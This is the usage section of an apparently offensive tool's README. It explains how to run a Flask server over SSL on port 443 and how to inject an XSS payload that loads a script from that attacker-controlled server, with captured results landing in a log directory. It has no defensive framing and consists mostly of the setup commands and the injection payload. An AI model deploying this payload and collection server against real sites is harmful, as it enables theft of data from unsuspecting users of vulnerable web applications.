
### usage
* requires python 3 and flask

```bash
sudo apt update && sudo apt install -y python3-flask
```

* put ssl files in project (cert.pem, key.pem)

* run on your server:

```bash
sudo python3 server.py 443
```

* load this script with an xss:
```html
<script/src="https://yourserver/a.js"></script>
```

* see the files in the log directory
